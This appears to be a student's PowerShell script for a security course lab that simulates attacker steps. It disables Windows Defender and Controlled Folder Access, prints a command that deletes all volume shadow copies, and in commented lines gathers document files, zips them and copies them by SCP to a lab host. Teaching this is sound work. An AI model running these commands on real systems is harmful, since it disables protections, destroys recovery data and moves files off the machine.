# Task 2
# 1. Find the Powershell cmdlet to disable Windows Defender.  Be sure you use the options to the cmdlet that disables Controlled 
# Folder Access too. 

# Disable Windows Defender and disable Controlled Folder Access
Set-MpPreference -DisableRealtimeMonitoring $true -EnableControlledFolderAccess Disabled

# Remote restore points and delete volume shadow copies
Write-Output "vssadmin delete shadows /all"

# Task 1: Search the filesystem (use the "Documents" folder from Week 12 to represent the filesystem) for docx, xlsx, pdf, and txt
# files and copy those to a new folder of your choice.  Zip the folder containing the files using the Powershell cmdlet.  
# Use Powershell to scp the zipped file over to 192.168.6.71 port 2222.

#Expand-Archive .\Documents.zip

# Search Documents Folder for docx, xlsx, pdf, and txt files and move those to a the FIleSystem folder

#Get-Childitem -recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\Documents | `
#Move-Item -Destination C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem

# Compress files found into folder named FileSystem

#Compress-Archive -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem -DestinationPath `
#C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem_Zip

# Export found files into csv

#Get-Childitem -recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem | Export-CSV -Path C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem.csv

#Install-Module -Name Posh-SSH

# Move zip file to remote host

#Set-SCPItem -Computername '192.168.6.71' -Port 2222 -Credential (Get-Credential asani.vessup) `
#-Destination '/home/asani.vessup' -Path 'C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week13\Assignment\FileSystem_Zip.zip'